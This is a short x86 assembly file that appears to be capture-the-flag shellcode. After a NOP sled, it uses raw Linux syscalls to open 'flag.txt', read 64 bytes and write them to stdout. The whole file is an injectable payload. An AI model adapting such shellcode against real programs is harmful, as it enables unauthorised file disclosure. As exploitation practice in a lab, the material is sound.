.global main

.section .data

.section .text

main:

nop
nop
nop
nop
nop
nop
mov $0x5, %eax
push $0x0
push $0x7478742e
push $0x67616c66
push %esp
pop %ebx
mov $0x0, %ecx
int $0x80

sub $0x40, %esp
mov %eax, %ebx
mov %esp, %ecx
mov $0x40, %edx
mov $0x3, %eax
int $0x80

mov %eax, %edx
mov $0x4, %eax
mov $0x1, %ebx
int $0x80
nop
nop
nop
nop
